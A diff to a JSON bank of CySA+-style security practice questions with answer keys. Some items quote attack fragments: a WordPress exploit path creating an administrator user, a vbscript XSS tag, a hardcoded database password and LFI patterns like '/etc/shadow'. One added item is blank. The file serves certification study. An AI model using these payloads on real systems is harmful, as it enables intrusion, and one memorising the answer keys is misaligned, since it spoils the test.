+    "question": "A security analyst must preserve a system hard drive that was involved in a litigation request. Which of the following is the best method to ensure the data on the device is not modified?",
     "choices": {
       "A": "Generate a hash value and make a backup image.",
       "B": "Encrypt the device to ensure confidentiality of the data.",
@@ -923,14 +924,14 @@
       "D": "Perform a memory scan dump to collect residual data"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen36.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following steps should be taken next?",
+    "question": "While reviewing web server logs, an analyst notices several entries with the same time stamps, but all contain odd characters in the request line. Which of the following steps should be taken next?",
     "choices": {
       "A": "Shut the network down immediately and call the next person in the chain of command.",
       "B": "Determine what attack the odd characters are indicative of.",
@@ -938,14 +939,14 @@
       "D": "Notify the local law enforcement for incident response."
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen37.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following should the team create to address this issue?",
+    "question": "A security team conducts a lessons-learned meeting after struggling to determine who should conduct the next steps following a security event. Which of the following should the team create to address this issue?",
     "choices": {
       "A": "Service-level agreement",
       "B": "Change management plan",
@@ -953,14 +954,14 @@
       "D": "Memorandum of understanding"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen38.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following is the best mitigation technique?",
+    "question": "A cybersecurity analyst notices unusual network scanning activity coming from a country that the company does not do business with. Which of the following is the best mitigation technique?",
     "choices": {
       "A": "Geoblock the offending source country.",
       "B": "Block the IP range of the scans at the network firewall.",
@@ -968,14 +969,14 @@
       "D": "Block the specific IP address of the scans at the network firewall."
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen39.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following controls would work best to mitigate the attack represented by this snippet?",
+    "question": "An analyst has received an IPS event notification from the SIEM stating an IP address, which is known to be malicious, has attempted to exploit a zero-day vulnerability on several web servers. The exploit contained the following snippet:\n\n/wp-/trx_addons/V2/get/sc_layout?sc=wp_insert_user&role=administrator\n\nWhich of the following controls would work best to mitigate the attack represented by this snippet?",
     "choices": {
       "A": "Limit user creation to administrators only.",
       "B": "Limit layout creation to administrators only.",
@@ -983,14 +984,14 @@
       "D": "Set the directory V2 to read only for all users."
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen4.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following should be recommended for remediation of this application vulnerability?",
+    "question": "A penetration tester submitted data to a form in a web application, which enabled the penetration tester to retrieve user credentials.\n\nWhich of the following should be recommended for remediation of this application vulnerability?",
     "choices": {
       "A": "Implementing multifactor authentication on the server OS",
       "B": "Hashing user passwords on the web application",
@@ -998,14 +999,14 @@
       "D": "Segmenting the network between the users and the web server"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen40.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following metrics should the team lead include in the briefs?",
+    "question": "A cybersecurity team lead is developing metrics to present in the weekly executive briefs. Executives are interested in knowing how long it takes to stop the spread of malware that enters the network.\n\nWhich of the following metrics should the team lead include in the briefs?",
     "choices": {
       "A": "Mean time between failures",
       "B": "Mean time to detect",
@@ -1013,14 +1014,14 @@
       "D": "Mean time to contain"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen41.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following indicators would most likely lead the team to this conclusion?",
+    "question": "A cloud team received an alert that unauthorized resources were being auto-provisioned. After investigating, the team suspects that cryptomining is occurring. Which of the following indicators would most likely lead the team to this conclusion?",
     "choices": {
       "A": "High GPU utilization",
       "B": "Bandwidth consumption",
@@ -1028,14 +1029,14 @@
       "D": "Unusual traffic spikes"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen42.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Besides the security team, which of the following groups should the issue be escalated to first in order to comply with industry best practices?",
+    "question": "A company's security team is updating a section of the reporting policy that pertains to inappropriate use of resources (e.g., an employee who installs cryptominers on workstations in the office). Besides the security team, which of the following groups should the issue be escalated to first in order to comply with industry best practices?",
     "choices": {
       "A": "Help desk",
       "B": "Law enforcement",
@@ -1043,14 +1044,14 @@
       "D": "Board member"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen43.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following attributes correctly describes this vulnerability?",
+    "question": "Given the following CVSS string:\n\nAV:L/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H\n\nWhich of the following attributes correctly describes this vulnerability?",
     "choices": {
       "A": "A user is required to exploit this vulnerability.",
       "B": "The vulnerability is network based.",
@@ -1058,14 +1059,14 @@
       "D": "The complexity to exploit the vulnerability is high."
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen44.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following describes where the analyst can find these configuration items?",
+    "question": "A systems analyst is limiting user access to system configuration keys and values in a Windows environment. Which of the following describes where the analyst can find these configuration items?",
     "choices": {
       "A": "config.ini",
       "B": "ntds.dit",
@@ -1073,7 +1074,7 @@
       "D": "Registry"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen45.jpg",
     "image_statement": "",
     "answer": [
       "D"
@@ -1088,14 +1089,14 @@
       "D": "To check the effectiveness of the business continuity plan"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen46.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following is the most likely cause of the server issue?",
+    "question": "A virtual web server in a server pool was infected with malware after an analyst used the internet to research a system issue. After the server was rebuilt and added back into the server pool, users reported issues with the website, indicating the site could not be trusted.\n\nWhich of the following is the most likely cause of the server issue?",
     "choices": {
       "A": "The server was configured to use SSL to securely transmit data.",
       "B": "The server was supporting weak TLS protocols for client connections.",
@@ -1103,14 +1104,14 @@
       "D": "The digital certificate on the web server was self-signed."
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen47.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following should the security analyst perform first to categorize and prioritize the respective systems?",
+    "question": "A security analyst needs to ensure that systems across the organization are protected based on the sensitivity of the content each system hosts. The analyst is working with the respective system owners to help determine the best methodology that seeks to promote confidentiality, availability, and integrity of the data being hosted.\n\nWhich of the following should the security analyst perform first to categorize and prioritize the respective systems?",
     "choices": {
       "A": "Interview the users who access these systems.",
       "B": "Scan the systems to see which vulnerabilities currently exist.",
@@ -1118,7 +1119,7 @@
       "D": "Determine the asset value of each system."
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen48.jpg",
     "image_statement": "",
     "answer": [
       "D"
@@ -1133,14 +1134,14 @@
       "D": "KPI"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen49.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following best describes the activity that is taking place?",
+    "question": "A cybersecurity analyst is reviewing SIEM logs and observes consistent requests originating from an internal host to a blocklisted external server.\n\nWhich of the following best describes the activity that is taking place?",
     "choices": {
       "A": "Data exfiltration",
       "B": "Rogue device",
@@ -1148,14 +1149,14 @@
       "D": "Beaconing"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen5.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following is the most likely vulnerability in this system?",
+    "question": "A SOC analyst identifies the following content while examining the output of a debugger command over a client-server application:\n\ngetConnection(database01,\"alpha\",\"AxTv.127GdCx94GTd\");\n\nWhich of the following is the most likely vulnerability in this system?",
     "choices": {
       "A": "Lack of input validation",
       "B": "SQL injection",
@@ -1163,14 +1164,14 @@
       "D": "Buffer overflow"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen50.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following would best aid in decreasing the workload without increasing staff?",
+    "question": "A managed security service provider is having difficulty retaining talent due to an increasing workload caused by a client doubling the number of devices connected to the network.\n\nWhich of the following would best aid in decreasing the workload without increasing staff?",
     "choices": {
       "A": "SIEM",
       "B": "XDR",
@@ -1178,14 +1179,14 @@
       "D": "EDR"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen51.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following is the best step to preserve evidence?",
+    "question": "An employee is suspected of misusing a company-issued laptop. The employee has been suspended pending an investigation by human resources. Which of the following is the best step to preserve evidence?",
     "choices": {
       "A": "Disable the user’s network account and access to web resources.",
       "B": "Make a copy of the files as a backup on the server.",
@@ -1193,14 +1194,14 @@
       "D": "Make a forensic image of the device and create a SHA-1 hash."
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen52.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following best describes the threat actor attributed to the malicious activity?",
+    "question": "An analyst receives threat intelligence regarding potential attacks from an actor with seemingly unlimited time and resources.\n\nWhich of the following best describes the threat actor attributed to the malicious activity?",
     "choices": {
       "A": "Insider threat",
       "B": "Ransomware group",
@@ -1208,7 +1209,7 @@
       "D": "Organized crime"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen53.jpg",
     "image_statement": "",
     "answer": [
       "C"
@@ -1223,14 +1224,14 @@
       "D": "The root cause analysis identifies the contributing items that facilitated the event."
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen54.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following malicious activities was attempted?",
+    "question": "While reviewing web server logs, a security analyst found the following line: < IMG SRC='vbscript:msgbox(\"test\")' > Which of the following malicious activities was attempted?",
     "choices": {
       "A": "Command injection",
       "B": "XML injection",
@@ -1238,14 +1239,14 @@
       "D": "Cross-site scripting"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen55.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following is most likely true?",
+    "question": "A security analyst at a company called ACME Commercial notices there is outbound traffic to a host IP that resolves to https://office365password.acme.co. The site’s standard VPN logon page is www.acme.com/logon.\n\nWhich of the following is most likely true?",
     "choices": {
       "A": "This is a normal password change URL.",
       "B": "The security operations center is performing a routine password audit.",
@@ -1253,14 +1254,14 @@
       "D": "A social engineering attack is underway."
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen56.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following would be missing from a scan performed with this configuration?",
+    "question": "A security analyst is performing vulnerability scans on the network. The analyst installs a scanner appliance, configures the subnets to scan, and begins the scan of the network.\n\nWhich of the following would be missing from a scan performed with this configuration?",
     "choices": {
       "A": "Operating system version",
       "B": "Registry key values",
@@ -1268,14 +1269,14 @@
       "D": "IP address"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen57.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following patterns can the security analyst use to search the web server logs for evidence of exploitation of that particular vulnerability?",
+    "question": "A security analyst discovers an LFI vulnerability that can be exploited to extract credentials from the underlying host. Which of the following patterns can the security analyst use to search the web server logs for evidence of exploitation of that particular vulnerability?",
     "choices": {
       "A": "/etc/shadow",
       "B": "curl localhost",
@@ -1283,14 +1284,14 @@
       "D": "cat /proc/self/"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen58.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following scanning methods should be implemented to minimize the risk of OT/ICS devices malfunctioning due to the vulnerability identification process?",
+    "question": "A company is in the process of implementing a vulnerability management program. Which of the following scanning methods should be implemented to minimize the risk of OT/ICS devices malfunctioning due to the vulnerability identification process?",
     "choices": {
       "A": "Non-credentialed scanning",
       "B": "Passive scanning",
@@ -1298,14 +1299,14 @@
       "D": "Credentialed scanning"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen59.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following best practices should the company follow with this proxy?",
+    "question": "A company receives a penetration test report summary from a third party. The report summary indicates a proxy has some patches that need to be applied. The proxy is sitting in a rack and is not being used, as the company has replaced it with a new one. The CVE score of the vulnerability on the proxy is a 9.8.\n\nWhich of the following best practices should the company follow with this proxy?",
     "choices": {
       "A": "Leave the proxy as is.",
       "B": "Decommission the proxy.",
@@ -1313,14 +1314,14 @@
       "D": "Patch the proxy."
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen6.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following is most likely the issue with the system?",
+    "question": "An analyst is examining events in multiple systems but is having difficulty correlating data points. Which of the following is most likely the issue with the system?",
     "choices": {
       "A": "Access rights",
       "B": "Network segmentation",
@@ -1328,14 +1329,14 @@
       "D": "Invalid playbook"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen60.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following is the best option to help the analyst implement this recommendation?",
+    "question": "An analyst recommends that an EDR agent collect the source IP address, make a connection to the firewall, and create a policy to block the malicious source IP address across the entire network automatically.\n\nWhich of the following is the best option to help the analyst implement this recommendation?",
     "choices": {
       "A": "SOAR",
       "B": "SIEM",
@@ -1343,14 +1344,14 @@
       "D": "IoC"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen61.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following best describes a security analyst’s concern?",
+    "question": "An end-of-life date was announced for a widely used OS. A business-critical function is performed by some machinery that is controlled by a PC, which is utilizing the OS that is approaching the end-of-life date.\n\nWhich of the following best describes a security analyst’s concern?",
     "choices": {
       "A": "Any discovered vulnerabilities will not be remediated.",
       "B": "An outage of machinery would cost the organization money.",
@@ -1358,7 +1359,22 @@
       "D": "There are no compensating controls in place for the OS."
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen62.jpg",
+    "image_statement": "",
+    "answer": [
+      "A"
+    ]
+  },
+  {
+    "question": "A company is deploying new vulnerability scanning software to assess its systems. The current network is highly segmented, and the networking team wants to minimize the number of unique firewall rules.\n\nWhich of the following scanning techniques would be most efficient to achieve the objective?",
+    "choices": {
+      "A": "Deploy agents on all systems to perform the scans",
+      "B": "Deploy a central scanner and perform non-credentialed scans",
+      "C": "Deploy a cloud-based scanner and perform a network scan",
+      "D": "Deploy a scanner sensor on every segment and perform credentialed scans"
+    },
+    "image_question": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen63.jpg",
     "image_statement": "",
     "answer": [
       "A"
@@ -1373,14 +1389,14 @@
       "D": "Single sign-on"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen64.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following best meets this requirement?",
+    "question": "A SOC analyst recommends adding a layer of defense for all endpoints that will better protect against external threats regardless of the device’s operating system.\n\nWhich of the following best meets this requirement?",
     "choices": {
       "A": "SIEM",
       "B": "CASB",
@@ -1388,14 +1404,14 @@
       "D": "EDR"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen65.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following is the best solution to secure the network?",
+    "question": "A company is concerned with finding sensitive file storage locations that are open to the public. The current internal cloud network is flat.\n\nWhich of the following is the best solution to secure the network?",
     "choices": {
       "A": "Implement segmentation with ACLs.",
       "B": "Configure logging and monitoring to the SIEM.",
@@ -1403,14 +1419,14 @@
       "D": "Roll out an IDS."
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen66.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following should the analyst suggest to mitigate the vulnerability with the fewest changes to the current script and infrastructure?",
+    "question": "A security analyst is reviewing the findings of the latest vulnerability report for a company’s web application. The web application accepts files for a Bash script to be processed if the files match a given hash. The analyst is able to submit files to the system due to a hash collision.\n\nWhich of the following should the analyst suggest to mitigate the vulnerability with the fewest changes to the current script and infrastructure?",
     "choices": {
       "A": "Deploy a WAF to the front of the application.",
       "B": "Replace the current MD5 with SHA-256.",
@@ -1418,14 +1434,14 @@
       "D": "Replace the MD5 with digital signatures."
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen67.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following should the analyst do first?",
+    "question": "A security analyst needs to mitigate a known, exploited vulnerability related to an attack vector that embeds software through the USB interface. Which of the following should the analyst do first?",
     "choices": {
       "A": "Conduct security awareness training on the risks of using unknown and unencrypted USBs.",
       "B": "Write a removable media policy that explains that USBs cannot be connected to a company asset.",
@@ -1433,14 +1449,14 @@
       "D": "Review logs to see whether this exploitable vulnerability has already impacted the company."
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen68.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following tools would best help to prove whether this server was experiencing this behavior?",
+    "question": "A systems administrator receives reports of an internet-accessible Linux server that is running very sluggishly. The administrator examines the server, sees a high amount of memory utilization, and suspects a DoS attack related to half-open TCP sessions consuming memory.\n\nWhich of the following tools would best help to prove whether this server was experiencing this behavior?",
     "choices": {
       "A": "Nmap",
       "B": "TCPDump",
@@ -1448,14 +1464,14 @@
       "D": "EDR"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen69.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following is the best approach to ensure all vulnerabilities are patched in accordance with the SLA?",
+    "question": "A recent vulnerability scan resulted in an abnormally large number of critical and high findings that require patching. The SLA requires that the findings be remediated within a specific amount of time.\n\nWhich of the following is the best approach to ensure all vulnerabilities are patched in accordance with the SLA?",
     "choices": {
       "A": "Integrate an IT service delivery ticketing system to track remediation and closure",
       "B": "Create a compensating control item until the system can be fully patched",
@@ -1463,14 +1479,14 @@
       "D": "Request an exception and manually patch each system"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen7.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following best describes the remediation that could reduce the impact of this situation?",
+    "question": "An organization was compromised, and the usernames and passwords of all employees were leaked online. Which of the following best describes the remediation that could reduce the impact of this situation?",
     "choices": {
       "A": "Multifactor authentication",
       "B": "Password changes",
@@ -1478,29 +1494,14 @@
       "D": "Password encryption"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen70.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following scanning techniques would be most efficient to achieve the objective?",
-    "choices": {
-      "A": "Deploy agents on all systems to perform the scans",
-      "B": "Deploy a central scanner and perform non-credentialed scans",
-      "C": "Deploy a cloud-based scanner and perform a network scan",
-      "D": "Deploy a scanner sensor on every segment and perform credentialed scans"
-    },
-    "image_question": "",
-    "image_solution": "",
-    "image_statement": "",
-    "answer": [
-      "A"
-    ]
-  },
-  {
-    "question": "Which of the following pieces of data should be collected first in order to preserve sensitive information before isolating the server?",
+    "question": "An incident response team found IoCs in a critical server. The team needs to isolate and collect technical evidence for further investigation. Which of the following pieces of data should be collected first in order to preserve sensitive information before isolating the server?",
     "choices": {
       "A": "Hard disk",
       "B": "Primary boot partition",
@@ -1509,7 +1510,7 @@
       "E": "Static IP address"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen71.jpg",
     "image_statement": "",
     "answer": [
       "D"
@@ -1524,14 +1525,14 @@
       "D": "Card issuer"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen72.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following implications should be considered on the new hybrid environment?",
+    "question": "A company is implementing a vulnerability management program and moving from an on-premises environment to a hybrid IaaS cloud environment. Which of the following implications should be considered on the new hybrid environment?",
     "choices": {
       "A": "The current scanners should be migrated to the cloud",
       "B": "Cloud-specific misconfigurations may not be detected by the current scanners",
@@ -1539,14 +1540,14 @@
       "D": "Vulnerability scans on cloud environments should be performed from the cloud"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen73.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following is the best way to ensure that the investigation complies with HR or privacy policies?",
+    "question": "A security alert was triggered when an end user tried to access a website that is not allowed per organizational policy. Since the action is considered a terminable offense, the SOC analyst collects the authentication logs, web logs, and temporary files, reflecting the web searches from the user's workstation, to build the case for the investigation. Which of the following is the best way to ensure that the investigation complies with HR or privacy policies?",
     "choices": {
       "A": "Create a timeline of events detailing the date stamps, user account hostname and IP information associated with the activities",
       "B": "Ensure that the case details do not reflect any user-identifiable information Password protect the evidence and restrict access to personnel related to the investigation",
@@ -1554,14 +1555,14 @@
       "D": "Notify the SOC manager for awareness after confirmation that the activity was intentional"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen74.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following should be the next step in the remediation process?",
+    "question": "A technician identifies a vulnerability on a server and applies a software patch.\n\nWhich of the following should be the next step in the remediation process?",
     "choices": {
       "A": "Testing",
       "B": "Implementation",
@@ -1569,14 +1570,14 @@
       "D": "Rollback"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen75.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following best describes what the security program did?",
+    "question": "A security program was able to achieve a 30% improvement in MTTR by integrating security controls into a SIEM. The analyst no longer had to jump between tools. Which of the following best describes what the security program did?",
     "choices": {
       "A": "Data enrichment",
       "B": "Security control plane",
@@ -1584,14 +1585,14 @@
       "D": "Single pane of glass"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen76.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following would best protect this organization?",
+    "question": "The Chief Executive Officer of an organization recently heard that exploitation of new attacks in the industry was happening approximately 45 days after a patch was released.\n\nWhich of the following would best protect this organization?",
     "choices": {
       "A": "A mean time to remediate of 30 days",
       "B": "A mean time to detect of 45 days",
@@ -1599,29 +1600,29 @@
       "D": "Third-party application testing"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen77.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following most likely describes the observed activity?",
+    "question": "A company’s user accounts have been compromised. Users are also reporting that the company’s internal portal is sometimes only accessible through HTTP, other times; it is accessible through HTTPS.\n\nWhich of the following most likely describes the observed activity?",
     "choices": {
       "A": "There is an issue with the SSL certificate causing port 443 to become unavailable for HTTPS access",
       "B": "An on-path attack is being performed by someone with internal access that forces users into port 80",
       "C": "The web server cannot handle an increasing amount of HTTPS requests so it forwards users to port 80",
-      "D": "An error was caused by BGP due to new rules applied over the company's internal routers"
+      "D": "An error was caused by BGP due to new rules applied over the company’s internal routers"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen78.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following solutions will assist in reducing the risk?",
+    "question": "The Chief Information Security Officer wants to eliminate and reduce shadow IT in the enterprise. Several high-risk cloud applications are used that increase the risk to the organization.\n\nWhich of the following solutions will assist in reducing the risk?",
     "choices": {
       "A": "Deploy a CASB and enable policy enforcement",
       "B": "Configure MFA with strict access",
@@ -1629,14 +1630,14 @@
       "D": "Enable SSO to the cloud applications"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen79.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following logs should the team review first?",
+    "question": "An incident response team receives an alert to start an investigation of an internet outage. The outage is preventing all users in multiple locations from accessing external SaaS resources. The team determines the organization was impacted by a DDoS attack. Which of the following logs should the team review first?",
     "choices": {
       "A": "CDN",
       "B": "Vulnerability scanner",
@@ -1644,14 +1645,14 @@
       "D": "Web server"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen8.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following best describes the current stage of the Cyber Kill Chain that the threat actor is currently operating in?",
+    "question": "A malicious actor has gained access to an internal network by means of social engineering. The actor does not want to lose access in order to continue the attack.\n\nWhich of the following best describes the current stage of the Cyber Kill Chain that the threat actor is currently operating in?",
     "choices": {
       "A": "Weaponization",
       "B": "Reconnaissance",
@@ -1659,14 +1660,14 @@
       "D": "Exploitation"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen80.jpg",
     "image_statement": "",
     "answer": [
       "D"
     ]
   },
   {
-    "question": "Which of the following steps of an attack framework is the analyst witnessing?",
+    "question": "An analyst finds that an external IP address is being used to run network and vulnerability scans on the company's public-facing assets.\n\nWhich of the following steps of an attack framework is the analyst witnessing?",
     "choices": {
       "A": "Exploitation",
       "B": "Reconnaissance",
@@ -1674,14 +1675,14 @@
       "D": "Actions on objectives"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen81.jpg",
     "image_statement": "",
     "answer": [
       "B"
     ]
   },
   {
-    "question": "Which of the following recommendations would best mitigate this problem if applied along the SDLC phase?",
+    "question": "During security scanning, a security analyst regularly finds the same vulnerabilities in a critical application. Which of the following recommendations would best mitigate this problem if applied along the SDLC phase?",
     "choices": {
       "A": "Conduct regular red team exercises over the application in production",
       "B": "Ensure that all implemented coding libraries are regularly checked",
@@ -1689,14 +1690,14 @@
       "D": "Implement proper input validation for any data entry form"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen82.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following inhibitors to remediation do these systems and associated vulnerabilities best represent?",
+    "question": "An analyst is reviewing a vulnerability report and must make recommendations to the executive team. The analyst finds that most systems can be upgraded with a reboot resulting in a single downtime window. However, two of the critical systems cannot be upgraded due to a vendor appliance that the company does not have access to.\n\nWhich of the following inhibitors to remediation do these systems and associated vulnerabilities best represent?",
     "choices": {
       "A": "Proprietary systems",
       "B": "Legacy systems",
@@ -1704,14 +1705,29 @@
       "D": "Lack of maintenance windows"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen83.jpg",
     "image_statement": "",
     "answer": [
       "A"
     ]
   },
   {
-    "question": "Which of the following will produce the data needed for the briefing?",
+    "question": "",
+    "choices": {
+      "A": "",
+      "B": "",
+      "C": "",
+      "D": ""
+    },
+    "image_question": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen84.jpg",
+    "image_statement": "",
+    "answer": [
+      ""
+    ]
+  },
+  {
+    "question": "A new cybersecurity analyst is tasked with creating an executive briefing on possible threats to the organization. Which of the following will produce the data needed for the briefing?",
     "choices": {
       "A": "Firewall logs",
       "B": "Indicators of compromise",
@@ -1719,14 +1735,14 @@
       "D": "Access control lists"
     },
     "image_question": "",
-    "image_solution": "",
+    "image_solution": "/assets/images/questionscysaplus/imagen85.jpg",
     "image_statement": "",
     "answer": [
       "C"
     ]
   },
   {
-    "question": "Which of the following can the analyst perform to see the entire contents of the downloaded files?",
+    "question": "A security analyst is reviewing a packet capture in Wireshark that contains an FTP session from a potentially compromised machine. The analyst sets the following display filter: ftp. The analyst can see there are several RETR requests with 226 Transfer complete responses, but the packet list pane is not showing the packets containing the file transfer itself.\n\nWhich of the following can the analyst perform to see the entire contents of the downloaded files?",
     "choices": {
       "A": "Change the display filter to ftp.active.port",
       "B": "Change the display filter to tcp.port==20",
@@ -1734,14 +1750,14 @@
